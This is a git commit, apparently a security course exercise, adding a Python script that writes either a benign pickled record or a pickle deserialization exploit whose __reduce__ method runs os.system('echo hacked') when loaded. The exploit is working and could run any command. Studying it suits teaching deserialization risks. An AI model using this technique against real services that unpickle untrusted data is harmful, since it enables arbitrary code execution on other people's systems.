1afca818b2339f00e44e8342ea70e22efd5ed3f1
user <rotem.ge100@gmail.com>
2017-05-16 18:46:54 +0300

    q1-q3

---
+++ q2/q2.py
@@ -0,0 +1,37 @@
+import pickle
+import os
+
+
+def generate_example():
+    return pickle.dumps({'username': 'dan', 'password': '1234', 'command': 'echo cool'})
+
+
+def generate_exploit():
+    class Exploit(object):
+        def __reduce__(self):
+            return (os.system, ('echo hacked',))
+
+    return pickle.dumps(Exploit())
+
+
+
+def main(argv):
+    if not 2 <= len(argv) <= 3:
+        print('USAGE: %s [--example] <script-path>' % argv[0])
+        return 1
+    if len(argv) == 2:
+        example, path = False, argv[1]
+    else:
+        example, path = True,  argv[2]
+    if example:
+        script = generate_example()
+    else:
+        script = generate_exploit()
+    with open(path, 'w') as writer:
+        writer.write(script)
+    print('done')
+
+
+if __name__ == '__main__':
+    import sys
+    sys.exit(main(sys.argv))
